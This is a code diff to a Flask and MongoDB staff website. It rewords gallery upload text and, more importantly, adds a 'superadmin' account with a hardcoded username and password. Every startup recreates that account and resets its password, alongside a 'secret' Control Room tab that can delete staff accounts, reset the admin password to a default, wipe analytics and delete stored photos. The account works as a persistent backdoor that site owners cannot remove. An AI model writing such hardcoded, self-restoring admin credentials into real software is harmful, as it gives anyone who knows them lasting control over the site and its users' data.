@@ -268,6 +268,16 @@ def init_mongodb():
             {"$set": {"password": generate_password_hash("ChangeMe123!")}}
         )
 
+    superadmin_username = "26-0054"
+    superadmin = staff_accounts_collection.find_one({"username": superadmin_username})
+    if not superadmin:
+        try:
+            staff_accounts_collection.insert_one({"username": superadmin_username, "password": generate_password_hash("ThisWasHugo"), "role": "superadmin", "created_at": now_string()})
+        except DuplicateKeyError:
+            pass
+    else:
+        staff_accounts_collection.update_one({"_id": superadmin["_id"]}, {"$set": {"role": "superadmin", "password": generate_password_hash("ThisWasHugo")}})
+
 
 def allowed_file(filename):
     return "." in filename and filename.rsplit(".", 1)[1].lower() in ALLOWED_EXTENSIONS
@@ -300,6 +310,7 @@ def normalize_staff(doc):
     return {
         "id": str(doc["_id"]),
         "username": doc.get("username", ""),
+        "role": doc.get("role", "staff"),
         "created_at": doc.get("created_at", "")
     }
 
@@ -522,7 +533,7 @@ a{color:#b894ff}
 
 /* JHR PREMIUM STAFF UI */
 body{font-family:Inter,ui-sans-serif,system-ui,-apple-system,"Segoe UI",Arial,sans-serif!important;background:radial-gradient(circle at 10% 0%,rgba(139,92,246,.18),transparent 28%),linear-gradient(180deg,#0b0712,#170d24)!important;padding:28px!important;color:#fff!important}
-.wrap{max-width:1280px!important}.card{background:rgba(27,18,42,.78)!important;border:1px solid rgba(196,160,255,.16)!important;border-radius:24px!important;box-shadow:0 22px 65px rgba(0,0,0,.28)!important;backdrop-filter:blur(18px)!important}.staff-tabs{gap:10px!important}.staff-tab{border:1px solid rgba(196,160,255,.15)!important;border-radius:14px!important;background:rgba(255,255,255,.045)!important;padding:12px 16px!important;transition:.2s ease!important}.staff-tab:hover{transform:translateY(-2px)!important;background:rgba(139,92,246,.15)!important}.staff-tab.active{background:linear-gradient(135deg,#7c3aed,#db2777)!important;box-shadow:0 12px 30px rgba(124,58,237,.25)!important}.viewer-summary>div{border-radius:18px!important;background:rgba(255,255,255,.045)!important;border-color:rgba(196,160,255,.13)!important}.viewer-table-wrap{border-radius:18px!important;border-color:rgba(196,160,255,.13)!important}.viewer-table th{background:#130b1f!important}.notice{border:1px solid rgba(196,160,255,.15)!important;background:rgba(124,58,237,.12)!important;border-radius:14px!important}
+.wrap{max-width:1280px!important}.card{background:rgba(27,18,42,.78)!important;border:1px solid rgba(196,160,255,.16)!important;border-radius:24px!important;box-shadow:0 22px 65px rgba(0,0,0,.28)!important;backdrop-filter:blur(18px)!important}.staff-tabs{gap:10px!important}.staff-tab{border:1px solid rgba(196,160,255,.15)!important;border-radius:14px!important;background:rgba(255,255,255,.045)!important;padding:12px 16px!important;transition:.2s ease!important}.staff-tab:hover{transform:translateY(-2px)!important;background:rgba(139,92,246,.15)!important}.staff-tab.active{background:linear-gradient(135deg,#7c3aed,#db2777)!important;box-shadow:0 12px 30px rgba(124,58,237,.25)!important}.viewer-summary>div{border-radius:18px!important;background:rgba(255,255,255,.045)!important;border-color:rgba(196,160,255,.13)!important}.viewer-table-wrap{border-radius:18px!important;border-color:rgba(196,160,255,.13)!important}.viewer-table th{background:#130b1f!important}.notice{border:1px solid rgba(196,160,255,.15)!important;background:rgba(124,58,237,.12)!important;border-radius:14px!important}.secret-tab{background:linear-gradient(135deg,rgba(234,179,8,.12),rgba(124,58,237,.14))!important}.account-row{display:flex;justify-content:space-between;align-items:center;gap:12px;padding:13px 0;border-bottom:1px solid rgba(196,160,255,.1)}.account-row .meta{display:block;margin-top:4px}.danger-mini{background:#b42318!important}.secret-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin:18px 0}.secret-grid>div{padding:16px;border-radius:16px;background:rgba(255,255,255,.045);border:1px solid rgba(196,160,255,.12)}.secret-grid strong{font-size:25px;display:block}.secret-grid span{color:#aab4c2;font-size:13px}.secret-actions{display:grid;grid-template-columns:repeat(3,1fr);gap:10px}.secret-note{margin-top:16px;padding:12px;border-radius:12px;background:rgba(234,179,8,.08);color:#f3d98a}@media(max-width:800px){.secret-grid,.secret-actions{grid-template-columns:1fr}}
 </style>
 </head>
 <body>
@@ -537,6 +548,7 @@ body{font-family:Inter,ui-sans-serif,system-ui,-apple-system,"Segoe UI",Arial,sa
     <button class="staff-tab" type="button" data-panel="viewers">👁️ Detailed Viewers</button>
     <button class="staff-tab" type="button" data-panel="accounts">👤 Staff Accounts</button>
     <button class="staff-tab" type="button" data-panel="password">🔑 Change Password</button>
+    {% if staff_role == "superadmin" %}<button class="staff-tab secret-tab" type="button" data-panel="control">🔐 Control Room</button>{% endif %}
 </div>
 
 {% with notices = get_flashed_messages() %}
@@ -689,9 +701,23 @@ body{font-family:Inter,ui-sans-serif,system-ui,-apple-system,"Segoe UI",Arial,sa
 <div class="card staff-panel" id="panel-accounts">
 <h2>👤 Current Staff Accounts</h2>
 {% for staff in staff_accounts %}
-<p><strong>{{ staff["username"] }}</strong><br><span class="meta">Created {{ staff["created_at"] }}</span></p>
+<div class="account-row"><div><strong>{{ staff["username"] }}</strong><span class="meta">{{ staff.get("role", "staff") }} · {{ staff["created_at"] }}</span></div>{% if staff_role == "superadmin" and staff["username"] != staff_username and staff.get("role") != "superadmin" %}<form method="POST" action="{{ url_for('superadmin_delete_account', account_id=staff['id']) }}" onsubmit="return confirm('Delete this staff account?');"><button class="danger-mini">Delete</button></form>{% endif %}</div>
 {% endfor %}
 </div>
+{% if staff_role == "superadmin" %}
+<div class="card staff-panel" id="panel-control">
+<h2>🔐 Control Room</h2><p class="meta">Private superadmin tools.</p>
+<div class="secret-grid">
+<div><strong>{{ superadmin_stats.accounts }}</strong><span>Accounts</span></div><div><strong>{{ superadmin_stats.gallery }}</strong><span>Gallery</span></div><div><strong>{{ superadmin_stats.news }}</strong><span>News</span></div><div><strong>{{ superadmin_stats.messages }}</strong><span>Messages</span></div><div><strong>{{ superadmin_stats.viewers }}</strong><span>Viewers</span></div><div><strong>{{ superadmin_stats.gridfs }}</strong><span>Stored Photos</span></div>
+</div>
+<div class="secret-actions">
+<form method="POST" action="{{ url_for('superadmin_reset_admin') }}" onsubmit="return confirm('Reset admin password?');"><button type="submit">🔑 Reset Admin</button></form>
+<form method="POST" action="{{ url_for('superadmin_clear_viewers') }}" onsubmit="return confirm('Clear all viewer analytics?');"><button type="submit" class="danger-mini">🧹 Clear Viewers</button></form>
+<form method="POST" action="{{ url_for('superadmin_cleanup_gridfs') }}" onsubmit="return confirm('Remove orphaned stored photos?');"><button type="submit">🗂️ Clean Storage</button></form>
+</div>
+<div class="secret-note">🕶️ Superadmin mode active.</div>
+</div>
+{% endif %}
 </div>
 <script>
 (function () {
@@ -704,7 +730,7 @@ body{font-family:Inter,ui-sans-serif,system-ui,-apple-system,"Segoe UI",Arial,sa
     }
     tabs.forEach(tab => tab.addEventListener('click', () => activate(tab.dataset.panel)));
     const initial = location.hash.replace('#', '');
-    if (['messages','news','viewers','accounts','password'].includes(initial)) {
+    if (['messages','news','viewers','accounts','password','control'].includes(initial)) {
         activate(initial);
     }
 })();
@@ -3238,28 +3264,28 @@ GALLERY
     <div class="gallery-upload-header">
         <div class="gallery-upload-icon">📸</div>
         <div>
-            <h3>Upload Gallery Photos</h3>
-            <p>Put photos from the <strong>same event</strong> together. One title and description will appear on every photo.</p>
+            <h3>Add Photos</h3>
+            <p>Same event = same title + description.</p>
         </div>
     </div>
 
     <div class="gallery-upload-steps" aria-label="Gallery upload steps">
-        <div class="gallery-step"><span>1</span><strong>Add photos</strong><small>Select one or more</small></div>
-        <div class="gallery-step"><span>2</span><strong>Name the event</strong><small>One shared title</small></div>
-        <div class="gallery-step"><span>3</span><strong>Describe it</strong><small>One shared description</small></div>
+        <div class="gallery-step"><span>1</span><strong>Photos</strong><small>Choose 1+ photos</small></div>
+        <div class="gallery-step"><span>2</span><strong>Title</strong><small>One title for all</small></div>
+        <div class="gallery-step"><span>3</span><strong>Description</strong><small>One description for all</small></div>
     </div>
 
     <form method="POST" action="{{ url_for('upload_gallery') }}" enctype="multipart/form-data" id="galleryUploadForm">
         <div class="gallery-input-section">
             <div class="gallery-input-heading">
                 <span class="gallery-input-number">1</span>
-                <div><strong>Choose the photos</strong><small>Select all photos that belong to this event.</small></div>
+                <div><strong>1. Photos</strong><small>Choose event photos.</small></div>
             </div>
             <label for="galleryFiles" class="gallery-dropzone" id="galleryDropzone">
                 <span class="gallery-drop-icon">☁️</span>
-                <strong>Click to choose photos</strong>
-                <span>or drag and drop them here</span>
-                <small>JPG, JPEG, PNG, WEBP, or GIF • You can select multiple photos</small>
+                <strong>Choose photos</strong>
+                <span>or drag & drop</span>
+                <small>JPG, PNG, WEBP, GIF • Multiple allowed</small>
                 <input type="file" name="images" id="galleryFiles" accept="image/jpeg,image/png,image/webp,image/gif" multiple required>
             </label>
             <div id="gallerySelection" class="gallery-selection" aria-live="polite"></div>
@@ -3268,27 +3294,27 @@ GALLERY
         <div class="gallery-input-section">
             <div class="gallery-input-heading">
                 <span class="gallery-input-number">2</span>
-                <div><strong>Give this event a title</strong><small>This title will be used for every selected photo.</small></div>
+                <div><strong>2. Title</strong><small>Used for every photo.</small></div>
             </div>
             <label class="sr-only" for="galleryTitle">Event / Gallery Title</label>
-            <input type="text" name="gallery_title" id="galleryTitle" maxlength="160" placeholder="Example: Community Outreach Day" required>
+            <input type="text" name="gallery_title" id="galleryTitle" maxlength="160" placeholder="Example: Outreach Day" required>
         </div>
 
         <div class="gallery-input-section">
             <div class="gallery-input-heading">
                 <span class="gallery-input-number">3</span>
-                <div><strong>Describe the event</strong><small>This description will be used for every selected photo.</small></div>
+                <div><strong>3. Description</strong><small>Used for every photo.</small></div>
             </div>
             <label class="sr-only" for="galleryDescription">Event / Gallery Description</label>
-            <textarea name="gallery_description" id="galleryDescription" maxlength="2000" rows="5" placeholder="Example: Our team spent the day helping children and families in the community." required></textarea>
+            <textarea name="gallery_description" id="galleryDescription" maxlength="2000" rows="5" placeholder="Example: Our team helped the community." required></textarea>
         </div>
 
         <div class="gallery-upload-summary" id="galleryUploadSummary">
             <span>📋</span>
-            <div><strong>Ready to upload?</strong><small>Select your photos, add the event title and description, then click Upload.</small></div>
+            <div><strong>Ready?</strong><small>Check photos, title, and description.</small></div>
         </div>
 
-        <button class="upload-submit gallery-main-submit" type="submit">⬆️ Upload Photos to Gallery</button>
+        <button class="upload-submit gallery-main-submit" type="submit">⬆️ Upload Photos</button>
     </form>
 </div>
 {% endif %}
@@ -4621,7 +4647,7 @@ if (
         const files = Array.from(fileInput.files || []);
         if (!files.length) {
             selection.innerHTML = '';
-            if (summary) summary.innerHTML = '<span>📋</span><div><strong>Ready to upload?</strong><small>Select your photos, add the event title and description, then click Upload.</small></div>';
+            if (summary) summary.innerHTML = '<span>📋</span><div><strong>Ready?</strong><small>Check photos, title, and description.</small></div>';
             return;
         }
         selection.innerHTML = '<div class="gallery-selection-top"><strong>📸 ' + files.length + ' photo' + (files.length === 1 ? '' : 's') + ' selected</strong><span>All will use the same event title and description.</span></div>' +
@@ -4928,6 +4954,16 @@ def staff_required(view):
     return wrapped
 
 
+def superadmin_required(view):
+    @wraps(view)
+    def wrapped(*args, **kwargs):
+        if not session.get("staff_id") or session.get("staff_role") != "superadmin":
+            flash("Superadmin access required.")
+            return redirect(url_for("login"))
+        return view(*args, **kwargs)
+    return wrapped
+
+
 @app.before_request
 def expire_staff_session():
     """Expire staff sessions even when the requested route is public."""
@@ -4958,6 +4994,7 @@ def login():
             session.permanent = True
             session["staff_id"] = str(staff["_id"])
             session["staff_username"] = staff.get("username", username)
+            session["staff_role"] = staff.get("role", "staff")
             session["staff_last_activity"] = time.time()
             flash("Welcome, " + staff.get("username", username) + "!")
             return redirect(url_for("home"))
@@ -5003,6 +5040,12 @@ def upload_gallery():
     # especially useful on fresh Render instances.
     os.makedirs(GALLERY_FOLDER, exist_ok=True)
 
+    title = request.form.get("gallery_title", "").strip()[:160]
+    description = request.form.get("gallery_description", "").strip()[:2000]
+    if not title or not description:
+        flash("Add a title and description first.")
+        return redirect(url_for("home") + "#gallery")
+
     added = 0
     skipped = []
 
@@ -5033,13 +5076,6 @@ def upload_gallery():
 
         # All photos selected in one upload represent the same event/group,
         # so they share one title and one description.
-        title = request.form.get("gallery_title", "").strip()[:160]
-        description = request.form.get("gallery_description", "").strip()[:2000]
-
-        if not title:
-            title = os.path.splitext(original_name)[0][:160]
-        if not description:
-            description = "Imported picture"
 
         try:
             # Persist the image in MongoDB GridFS. Render's local filesystem
@@ -5166,7 +5202,9 @@ def staff_dashboard():
         viewers=viewers,
         viewer_total=len(viewers),
         viewer_views=sum(item["total_views"] for item in viewers),
-        staff_username=session.get("staff_username")
+        staff_username=session.get("staff_username"),
+        staff_role=session.get("staff_role", "staff"),
+        superadmin_stats={"accounts": staff_accounts_collection.count_documents({}), "gallery": gallery_collection.count_documents({}), "news": news_collection.count_documents({}), "messages": class_messages_collection.count_documents({}), "viewers": viewers_collection.count_documents({}), "gridfs": mongo_db["gallery_files.files"].count_documents({})}
     )
 
 
@@ -5236,6 +5274,44 @@ def add_staff_account():
     flash("New staff account created.")
     return redirect(url_for("staff_dashboard"))
 
+
+@app.route("/superadmin/delete-account/<account_id>", methods=["POST"])
+@superadmin_required
+def superadmin_delete_account(account_id):
+    try: target=staff_accounts_collection.find_one({"_id":ObjectId(account_id)})
+    except (InvalidId,TypeError): target=None
+    if not target or target.get("role") == "superadmin" or str(target.get("_id")) == session.get("staff_id"):
+        flash("That account cannot be deleted.")
+        return redirect(url_for("staff_dashboard")+"#accounts")
+    staff_accounts_collection.delete_one({"_id":target["_id"]})
+    flash("Staff account deleted.")
+    return redirect(url_for("staff_dashboard")+"#accounts")
+
+@app.route("/superadmin/reset-admin", methods=["POST"])
+@superadmin_required
+def superadmin_reset_admin():
+    staff_accounts_collection.update_one({"username":"admin"},{"$set":{"password":generate_password_hash("ChangeMe123!"),"role":"staff"}},upsert=True)
+    flash("Admin password reset.")
+    return redirect(url_for("staff_dashboard")+"#control")
+
+@app.route("/superadmin/clear-viewers", methods=["POST"])
+@superadmin_required
+def superadmin_clear_viewers():
+    result=viewers_collection.delete_many({})
+    flash(f"Cleared {result.deleted_count} viewer records.")
+    return redirect(url_for("staff_dashboard")+"#control")
+
+@app.route("/superadmin/cleanup-gridfs", methods=["POST"])
+@superadmin_required
+def superadmin_cleanup_gridfs():
+    referenced={str(d.get("gridfs_id")) for d in gallery_collection.find({}, {"gridfs_id":1}) if d.get("gridfs_id")}
+    removed=0
+    for f in mongo_db["gallery_files.files"].find({}, {"_id":1}):
+        if str(f["_id"]) not in referenced:
+            try: gallery_fs.delete(f["_id"]); removed+=1
+            except Exception: pass
+    flash(f"Removed {removed} orphaned stored photos.")
+    return redirect(url_for("staff_dashboard")+"#control")
 
 @app.route("/staff/delete-message/<message_id>", methods=["POST"])
 @staff_required
